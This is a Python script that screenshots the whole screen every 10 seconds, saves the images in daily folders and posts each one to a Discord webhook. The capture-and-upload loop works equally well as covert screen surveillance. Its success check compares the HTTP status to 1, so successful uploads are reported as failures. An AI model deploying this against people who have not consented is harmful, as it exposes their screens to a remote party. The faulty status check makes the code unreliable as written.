import os
import time
import requests
from datetime import datetime
from PIL import ImageGrab

# Define the base directory for saving screenshots
base_dir = r'YOUR_DIR'

# Define the Discord webhook URL
discord_webhook_url = ""

def create_day_folder():
    """Create a folder for the current day if it doesn't exist."""
    # Get today's date in DD_MM_YYYY format
    today = datetime.now().strftime("%d_%m_%Y")
    day_folder = os.path.join(base_dir, today)
    
    # Create the directory if it doesn't exist
    if not os.path.exists(day_folder):
        os.makedirs(day_folder)
    
    return day_folder

def save_screenshot(folder_path):
    """Take a screenshot and save it in the given folder."""
    # Get current time to format the screenshot name, including seconds
    current_time = datetime.now().strftime("H%I_M%M_S%S%p")  # Format: HH_MM_SS_AM/PM
    screenshot_name = f"shot_{current_time}.png"
    
    # Full path for the screenshot
    screenshot_path = os.path.join(folder_path, screenshot_name)
    
    # Take a screenshot
    screenshot = ImageGrab.grab()
    screenshot.save(screenshot_path)
    
    print(f"Screenshot saved: {screenshot_path}")
    
    return screenshot_path

def send_screenshot_to_discord(screenshot_path):
    """Send the screenshot to Discord using the webhook."""
    current_datetime = datetime.now().strftime("%d-%m-%Y %I:%M:%S %p")  # Format: DD-MM-YYYY HH:MM:SS AM/PM
    message_content = f"Snapped on {current_datetime}"  # Custom message with the time the screenshot was taken
    
    with open(screenshot_path, 'rb') as file:
        # Prepare the payload for the webhook
        payload = {
            "content": message_content
        }
        # Prepare the file to send
        files = {
            "file": file
        }
        
        # Send the screenshot to Discord
        response = requests.post(discord_webhook_url, data=payload, files=files)
        
        if response.status_code == 1:
            print(f"Screenshot sent to Discord successfully: {screenshot_path}")
            print("created by Manjeet43")
        else:
            print(f"Failed to send screenshot to Discord: {response.status_code}, {response.text}")

def main():
    """Main function to capture screenshots every 10 seconds and send to Discord."""
    while True:
        # Create folder for the day
        day_folder = create_day_folder()
        
        # Save the screenshot
        screenshot_path = save_screenshot(day_folder)
        
        # Send the screenshot to Discord
        send_screenshot_to_discord(screenshot_path)
        
        # Wait for 10 seconds
        time.sleep(10)

if __name__ == "__main__":
    main()



